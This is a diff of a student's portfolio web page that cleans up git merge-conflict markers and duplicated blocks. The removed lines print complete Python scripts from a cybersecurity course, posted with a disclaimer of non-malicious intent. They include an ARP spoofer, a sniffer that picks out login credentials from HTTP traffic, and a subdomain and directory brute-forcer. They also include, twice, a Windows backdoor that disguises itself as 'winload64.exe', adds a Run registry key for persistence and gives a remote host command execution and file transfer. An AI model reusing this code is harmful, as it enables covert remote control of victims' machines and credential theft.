@@ -34,18 +34,6 @@
 
 
 
-  <link href="https://fonts.googleapis.com/css2?family=PT+Mono&display=swap" rel="stylesheet">
-
-
-
-  <link href="https://fonts.googleapis.com/css2?family=PT+Mono&display=swap" rel="stylesheet">
-
-
-
-  <link href="https://fonts.googleapis.com/css2?family=PT+Mono&display=swap" rel="stylesheet">
-
-
-
   <!-- =======================================================
   * Template Name: Personal
   * Updated: Jul 27 2023 with Bootstrap v5.3.1
@@ -128,6 +116,7 @@
           </div>
           <p>
           Thanks for visiting my page, this site is still an ongoing work.
+
           </p>
         </div>
       </div>
@@ -585,15 +574,7 @@ handling skills. Willing to be trained and eager to learn.</em></p>
             font-family: 'PT Mono', monospace;
           }
 
-<<<<<<< HEAD
-<<<<<<< HEAD
           span h3 {
-=======
-          h3 {
->>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
-=======
-          h3 {
->>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
             display: inline;
             color: #e1e2e6;
           }
@@ -609,25 +590,9 @@ handling skills. Willing to be trained and eager to learn.</em></p>
           }
 
 
-<<<<<<< HEAD
-<<<<<<< HEAD
         </style>
 
 
-=======
->>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
-
-        </style>
-
-
-    <div class="col-lg-12 col-md-12 portfolio-item filter-others">
-    </div>
-
-
-<<<<<<< HEAD
->>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
-=======
->>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
     <div class="intro">
       <p>Hello, this page contains scripts that I made as part of a cybersecurity course while also having to advance my Python skills and knowledges. Everything is straight out from the course except the "File Getter" script in which I made to apply and test what I've learned. Absolutely none of these scripts are made with a malicious intent and was and will never be used in such causes. Furthermore, I will never entertain any form of request from anyone asking my service that will serve for any inappropriate purposes. Thank you very much.</p>
 
@@ -635,7 +600,6 @@ handling skills. Willing to be trained and eager to learn.</em></p>
 
     </div></br><hr>
 <center>
-<<<<<<< HEAD
   <span><h3 id="python">Python</h3><h3> Scripts</h3></br></br></span>
 
   <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe1" data-popup-id="popup1">MAC Address Changer (Linux)</button>
@@ -648,19 +612,6 @@ handling skills. Willing to be trained and eager to learn.</em></p>
   <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe7" data-popup-id="popup8">Keylogger</button>
   <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe8" data-popup-id="popup9">File Getter</button>
   <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe9" data-popup-id="popup10">Vulnerability Scanner</button></br></br>
-  <h3 id="python">Python</h3><h3> Scripts</h3></br></br>
-
-  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe1" data-popup-id="popup1">MAC Address Changer (Linux)</button>
-  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe2" data-popup-id="popup2">Network Scanner</button>
-  <button class="openPopupButton green-underline-button hover-button left-scr" data-iframe-id="iframe3" data-popup-id="popup3">ARP Spoofer (MITM Attack)</button>
-  <button class="openPopupButton green-underline-button hover-button right-scr" data-iframe-id="iframe4" data-popup-id="popup4">Packet Sniffer (While MITM)</button>
-  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe5" data-popup-id="popup5">Website Crawler</button>
-  <button class="openPopupButton green-underline-button hover-button left-scr" data-iframe-id="iframe6" data-popup-id="popup6">Port Listener</button>
-  <button class="openPopupButton green-underline-button hover-button right-scr" data-iframe-id="iframe6" data-popup-id="popup6">Remote Backdoor</button>
-  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe7" data-popup-id="popup7">Keylogger (via email report)</button>
-  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe8" data-popup-id="popup8">File Getter</button>
-  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe9" data-popup-id="popup9">Vulnerability Scanner</button></br></br>
->>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
 </center>
 
 
@@ -734,7 +685,6 @@ handling skills. Willing to be trained and eager to learn.</em></p>
       <pre id="popup2Content">
 
         <--------------------------------- NETWORK SCANNER ------------------------------------>
-<<<<<<< HEAD
 
 
         #!usr/bin/python/env
@@ -1691,561 +1641,6 @@ handling skills. Willing to be trained and eager to learn.</em></p>
     </div>
   </div>
 
-  <div class="popup-overlay" id="popup2">
-    <div class="popup-content">
-      <span class="close-button" data-popup-id="popup2">&times;</span>
-      <pre id="popup2Content">
-
-        <--------------------------------- NETWORK SCANNER ------------------------------------>
-
-
-        #!usr/bin/python/env
-
-        import scapy.all as scapy
-        import scapy.layers.l2 as scapyA
-        import optparse
-
-
-        def get_arguments():
-            parser = optparse.OptionParser()
-            parser.add_option("-t", "--target", dest="target", help="Target IP/Client")
-            options = parser.parse_args()[0]
-            return options
-
-        def scan(ip):
-            arp_request = scapyA.ARP(pdst=ip)
-            broadcast = scapyA.Ether(dst="ff:ff:ff:ff:ff:ff")
-            # scapy.ls(scapyA.ARP())
-            arp_broadcast_request = broadcast/arp_request
-            answered_list = scapyA.srp(arp_broadcast_request, timeout=1)[0]
-            # print(answered.summary())
-
-
-            client_list=[]
-            for e in answered_list:
-                # print(e)
-                # print(e[1].psrc+"\t\t"+e[1].hwsrc)
-                client_dict={"IP":e[1].psrc, "MAC Address":e[1].hwsrc}
-                client_list.append(client_dict)
-                # print("================================+++++++++++++++++++++++++++++++++++++++++++===============================")
-
-            return(client_list)
-        def print_result(result_list):
-            print("IP\t\t\tMAC Address\n=======================================================================================")
-            for client in result_list:
-                print(client["IP"]+"\t\t"+client["MAC Address"])
-
-        target_client = get_arguments()
-        scan_result = scan(target_client.target)
-        print_result(scan_result)
-      </pre>
-    </div>
-  </div>
-
-  <div class="popup-overlay" id="popup3">
-    <div class="popup-content">
-      <span class="close-button" data-popup-id="popup3">&times;</span>
-      <pre id="popup2Content">
-
-        <--------------------------------- ARP SPOOFER ------------------------------------>
-
-
-        #!usr/bin/python/env
-        import sys
-        import scapy.all as scapy
-        import scapy.layers.l2 as scapyA
-        import optparse
-        import time
-        import os
-
-        def spoof(target_IP, spoof_IP):
-            target_mac = get_mac((target_IP))
-            packet = scapyA.ARP(op=2, pdst=target_IP, hwdst=target_mac, psrc=spoof_IP)
-            print(target_mac+"\n")
-            scapy.send(packet, verbose=False)
-
-        def restore(dest_IP, source_IP):
-            dest_MAC = get_mac((dest_IP))
-            source_MAC = get_mac(source_IP)
-            packet = scapyA.ARP(op=2, pdst=dest_IP, hwdst=dest_MAC, psrc=source_IP, hwsrc=source_MAC)
-            scapy.send(packet, count=4, verbose=False)
-
-
-        def get_mac(target_IP):
-            arp_req = scapyA.ARP(pdst=target_IP)
-            broadcast = scapyA.Ether(dst="ff:ff:ff:ff:ff:ff")
-            arp_broadcast_req = broadcast/arp_req
-            answer = scapyA.srp(arp_broadcast_req, timeout=1, verbose=False)[0]
-
-            for e in answer:
-                  mac = e[1].hwsrc
-                  return mac
-
-        target_IP = "192.168.46.129"
-        gateway_IP = "192.168.46.2"
-
-        sent_packets = 0
-        try:
-            while True:
-                spoof(target_IP, gateway_IP)
-                spoof(gateway_IP, target_IP)
-                sent_packets = sent_packets + 2
-                print("\r[+] Packets sent: " + str(sent_packets), end="")
-                sys.stdout.flush()
-                time.sleep(2)
-        except KeyboardInterrupt:
-            print("\n Ctrl + C pressed, Resetting ARP Table, please wait...")
-            restore(target_IP, gateway_IP)
-            restore(gateway_IP, target_IP)
-
-
-      </pre>
-    </div>
-  </div>
-
-  <div class="popup-overlay" id="popup4">
-    <div class="popup-content">
-      <span class="close-button" data-popup-id="popup4">&times;</span>
-      <pre id="popup2Content">
-
-        <--------------------------------- PACKET SNIFFER ------------------------------------>
-
-
-        #! usr/bin/env python
-        import scapy.all as scapy
-        from scapy.layers import http
-        import scapy.utils as scapyU
-
-        def sniff(interface):
-            scapy.sniff(iface=interface, store=False, prn=sniff_packet)
-
-        def get_url(packet):
-            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-            return url
-
-        def get_login_info(packet):
-            if packet.haslayer(scapy.Raw):
-                keywords = ["User", "Username", "Password", "Login", "login", "un", "pass"]
-                load = str(packet[scapy.Raw].load)
-                for keyword in keywords:
-                    if keyword in load:
-                        return load
-
-        def sniff_packet(packet):
-
-            if packet.haslayer(http.HTTPRequest):
-                url = get_url(packet)
-                login_info = get_login_info(packet)
-                print("[+] HTTP Request >>" + str(url))
-                print("Possible Login Information: " + str(login_info))
-
-        sniff("eth0")
-
-      </pre>
-    </div>
-  </div>
-
-  <div class="popup-overlay" id="popup5">
-    <div class="popup-content">
-      <span class="close-button" data-popup-id="popup5">&times;</span>
-      <pre id="popup2Content">
-
-        <--------------------------------- WEBSITE CRAWLER ------------------------------------>
-
-
-        #!usr/bin/python/env
-        import requests, urllib.parse, re
-
-        def get_response(url):
-            try:
-                req = requests.get(url)
-                if req.status_code == requests.codes.ok:
-                    print(requests.get(url))
-                    return req
-            except requests.exceptions.ConnectionError:
-                pass
-
-        url = "hackthissite.org"
-        with open ("subdomains.txt", "r") as wordlist:
-            for word in wordlist:
-                word = word.strip()
-                test_url = "http://" + word + "." + url
-                result = get_response(test_url)
-                if result:
-                    print("[+] Discovered subdomain --> " + test_url)
-
-        dir_url = "192.168.46.128"
-        with open ("files-and-dirs.txt", "r") as wordlist:
-            for word in wordlist:
-                word = word.strip()
-                test_url = "http://" + dir_url + "/" + word
-                # print(test_url)
-                result = get_response(test_url)
-
-                if result:
-                    print("[+] Discovered subdirectory --> " + test_url)
-
-
-        url = "https://carzone-p58h.onrender.com"
-        link_list = []
-        def get_href_links(url):
-            content = requests.get(url)
-            links = re.findall('(?:href=")(.*?)"', str(content.content))
-            return links
-
-        def crawl(url):
-            links = get_href_links(url)
-            for link in links:
-                link = urllib.parse.urljoin(url, link)
-                if "#" in link:
-                    link = link.split("#")[0]
-                if url in link and link not in link_list:
-                    link_list.append(link)
-                    print(link)
-                    crawl(link)
-
-        crawl(url)
-
-      </pre>
-    </div>
-  </div>
-
-  <div class="popup-overlay" id="popup6">
-    <div class="popup-content">
-      <span class="close-button" data-popup-id="popup6">&times;</span>
-      <pre id="popup2Content">
-        # -*- coding: utf-8 -*-
-
-        import socket
-        import subprocess
-        import re, json
-        import os
-        import base64
-        import sys
-        import shutil
-
-        class Backdoor:
-            def __init__(self, ip, port):
-                self.persist_exec()
-                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.connection.connect((ip, port))
-                # connection.send(b"\nConnected\n")
-
-            def persist_exec(self):
-                file_loc = os.environ["Appdata"] + "\\winload64.exe"
-                if not os.path.exists(file_loc):
-                    shutil.copyfile(sys.executable, file_loc)
-                    subprocess.call("reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d '"+ file_loc +"'")
-                    print("REGEDIT SUCCESSFUL")
-
-            def execute_command(self, command):
-                command_result =  command_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-                return (command_result.decode('utf-8'))
-
-            def change_working_directory(self, path):
-                os.chdir(path)
-                return "[+] Changing working directory to '" + path +"'"
-
-            def write_file(self, path, content):
-                with open(path, "wb") as new_file:
-                    new_file.write(base64.b64decode(content))
-                    print("[+] Upload Successful.")
-
-
-            def read_file(self, path):
-                with open (path, "rb") as file:
-                    file_content = base64.b64encode(file.read())
-                    print(type(file_content))
-                    file_str = file_content.decode()
-                    # print(file_str)
-                    return file_str
-
-
-            def reliable_send(self, data):
-                json_data = json.dumps(data)
-                # json_data = json_data.decode('utf-8')
-                self.connection.send(bytes(json_data.encode()))
-
-
-            def reliable_recv(self):
-                json_data = b""
-                while True:
-                    try:
-                        json_data = json_data + self.connection.recv(1024)
-                        return json.loads(json_data)
-                    except ValueError:
-                        continue
-
-            def run(self):
-                while True:
-
-                    command = self.reliable_recv()
-                    try:
-                        res = ""
-                        for i in range(len(command)):
-
-                            if i == 0:
-                                res += str(command[i])
-                            else:
-                                res += " " + str(command[i])
-
-                        if command[0] == "exit":
-                            self.connection.close()
-                            sys.exit()
-                        elif command[0] == "cd" and len(command) > 1:
-                            print(command[1])
-                            command_result = self.change_working_directory(command[1])
-                        elif command[0] == "dl":
-                            command_result = self.read_file(command[1])
-                        elif command[0] == "ul":
-                            command_result = self.write_file(command[1], command[2])
-                            print("[+] File Created.")
-                        else:
-                            command_result = self.execute_command(str(res))
-                    except Exception:
-                        command_result = "[!] Error during command execution, please recheck!"
-                    # print("COMMANDDDDDDDDDDDDDDDDD" + (str(res[1])))
-                    # commandre = re.search("(?:b')(.*)", str(command))
-                    # commandd = commandre.group(1)
-                    # final_command = commandd.replace("'","")
-                    # final_command = commandd.replace('""','')
-                    # print(final_command)
-                    # self.connection.send(command_result)
-                    self.reliable_send(command_result)
-                    print(command_result)
-
-        # front_file = sys._MEIPASS + "\Vecteezy-License-Information.pdf"
-        # subprocess.Popen(front_file, shell=True)
-
-        try:
-            my_backdoor = Backdoor("192.168.1.145", 4444)
-            my_backdoor.run()
-
-        except Exception:
-            sys.exit()
-
-      </pre>
-    </div>
-  </div>
-<center>
-  <iframe id="iframe1" class="hover-iframe" src="https://www.youtube.com/embed/cvnzPCGGD" width ="1000px" height="800px"></iframe>
-  <iframe id="iframe2" class="hover-iframe" src="https://www.youtube.com/embed/pZyMxhDTi" width ="1000px" height="800px"></iframe>
-
-</div>
-</center>
-
-
-
-
-
-
-  </div>
-</div>
-</div>
-
-      </pre>
-    </div>
-  </div>
-
-  <div class="popup-overlay" id="popup5">
-    <div class="popup-content">
-      <span class="close-button" data-popup-id="popup5">&times;</span>
-      <pre id="popup2Content">
-
-        <--------------------------------- WEBSITE CRAWLER ------------------------------------>
-
-
-        #!usr/bin/python/env
-        import requests, urllib.parse, re
-
-        def get_response(url):
-            try:
-                req = requests.get(url)
-                if req.status_code == requests.codes.ok:
-                    print(requests.get(url))
-                    return req
-            except requests.exceptions.ConnectionError:
-                pass
-
-        url = "hackthissite.org"
-        with open ("subdomains.txt", "r") as wordlist:
-            for word in wordlist:
-                word = word.strip()
-                test_url = "http://" + word + "." + url
-                result = get_response(test_url)
-                if result:
-                    print("[+] Discovered subdomain --> " + test_url)
-
-        dir_url = "192.168.46.128"
-        with open ("files-and-dirs.txt", "r") as wordlist:
-            for word in wordlist:
-                word = word.strip()
-                test_url = "http://" + dir_url + "/" + word
-                # print(test_url)
-                result = get_response(test_url)
-
-                if result:
-                    print("[+] Discovered subdirectory --> " + test_url)
-
-
-        url = "https://carzone-p58h.onrender.com"
-        link_list = []
-        def get_href_links(url):
-            content = requests.get(url)
-            links = re.findall('(?:href=")(.*?)"', str(content.content))
-            return links
-
-        def crawl(url):
-            links = get_href_links(url)
-            for link in links:
-                link = urllib.parse.urljoin(url, link)
-                if "#" in link:
-                    link = link.split("#")[0]
-                if url in link and link not in link_list:
-                    link_list.append(link)
-                    print(link)
-                    crawl(link)
-
-        crawl(url)
-
-      </pre>
-    </div>
-  </div>
-
-  <div class="popup-overlay" id="popup6">
-    <div class="popup-content">
-      <span class="close-button" data-popup-id="popup6">&times;</span>
-      <pre id="popup2Content">
-=======
->>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
-        # -*- coding: utf-8 -*-
-
-        import socket
-        import subprocess
-        import re, json
-        import os
-        import base64
-        import sys
-        import shutil
-
-        class Backdoor:
-            def __init__(self, ip, port):
-                self.persist_exec()
-                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.connection.connect((ip, port))
-                # connection.send(b"\nConnected\n")
-
-            def persist_exec(self):
-                file_loc = os.environ["Appdata"] + "\\winload64.exe"
-                if not os.path.exists(file_loc):
-                    shutil.copyfile(sys.executable, file_loc)
-                    subprocess.call("reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d '"+ file_loc +"'")
-                    print("REGEDIT SUCCESSFUL")
-
-            def execute_command(self, command):
-                command_result =  command_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-                return (command_result.decode('utf-8'))
-
-            def change_working_directory(self, path):
-                os.chdir(path)
-                return "[+] Changing working directory to '" + path +"'"
-
-            def write_file(self, path, content):
-                with open(path, "wb") as new_file:
-                    new_file.write(base64.b64decode(content))
-                    print("[+] Upload Successful.")
-
-
-            def read_file(self, path):
-                with open (path, "rb") as file:
-                    file_content = base64.b64encode(file.read())
-                    print(type(file_content))
-                    file_str = file_content.decode()
-                    # print(file_str)
-                    return file_str
-
-
-            def reliable_send(self, data):
-                json_data = json.dumps(data)
-                # json_data = json_data.decode('utf-8')
-                self.connection.send(bytes(json_data.encode()))
-
-
-            def reliable_recv(self):
-                json_data = b""
-                while True:
-                    try:
-                        json_data = json_data + self.connection.recv(1024)
-                        return json.loads(json_data)
-                    except ValueError:
-                        continue
-
-            def run(self):
-                while True:
-
-                    command = self.reliable_recv()
-                    try:
-                        res = ""
-                        for i in range(len(command)):
-
-                            if i == 0:
-                                res += str(command[i])
-                            else:
-                                res += " " + str(command[i])
-
-                        if command[0] == "exit":
-                            self.connection.close()
-                            sys.exit()
-                        elif command[0] == "cd" and len(command) > 1:
-                            print(command[1])
-                            command_result = self.change_working_directory(command[1])
-                        elif command[0] == "dl":
-                            command_result = self.read_file(command[1])
-                        elif command[0] == "ul":
-                            command_result = self.write_file(command[1], command[2])
-                            print("[+] File Created.")
-                        else:
-                            command_result = self.execute_command(str(res))
-                    except Exception:
-                        command_result = "[!] Error during command execution, please recheck!"
-                    # print("COMMANDDDDDDDDDDDDDDDDD" + (str(res[1])))
-                    # commandre = re.search("(?:b')(.*)", str(command))
-                    # commandd = commandre.group(1)
-                    # final_command = commandd.replace("'","")
-                    # final_command = commandd.replace('""','')
-                    # print(final_command)
-                    # self.connection.send(command_result)
-                    self.reliable_send(command_result)
-                    print(command_result)
-
-        # front_file = sys._MEIPASS + "\Vecteezy-License-Information.pdf"
-        # subprocess.Popen(front_file, shell=True)
-
-        try:
-            my_backdoor = Backdoor("192.168.1.145", 4444)
-            my_backdoor.run()
-
-        except Exception:
-            sys.exit()
-
-      </pre>
-    </div>
-  </div>
-<center>
-  <iframe id="iframe1" class="hover-iframe" src="https://www.youtube.com/embed/cvnzPCGGD" width ="1000px" height="800px"></iframe>
-  <iframe id="iframe2" class="hover-iframe" src="https://www.youtube.com/embed/pZyMxhDTi" width ="1000px" height="800px"></iframe>
-
-</div>
-</center>
-
-
-
-
-
-
-  </div>
-</div>
-</div>
 
 
 
@@ -2289,7 +1684,7 @@ handling skills. Willing to be trained and eager to learn.</em></p>
         <div class="col-md-6 mt-4 d-flex align-items-stretch">
           <div class="info-box">
             <i class="bx bx-envelope"></i>
-            <h3>Email mee</h3>
+            <h3>Email Me</h3>
             <p>jakevillamor222@gmail.com</p>
           </div>
         </div>
@@ -2350,14 +1745,8 @@ handling skills. Willing to be trained and eager to learn.</em></p>
   <script src="{% static 'jake_portfolio/assets/js/main.js' %}"></script>
   <script src="{% static 'jake_portfolio/assets/js/py_scripts.js' %}"></script>
   <script src="{% static 'jake_portfolio/assets/js/iframe.js' %}"></script>
-<<<<<<< HEAD
-<<<<<<< HEAD
   <script src="{% static 'jake_portfolio/assets/js/portfolio_others.js' %}"></script>
 
-=======
->>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
-=======
->>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
 
 
 
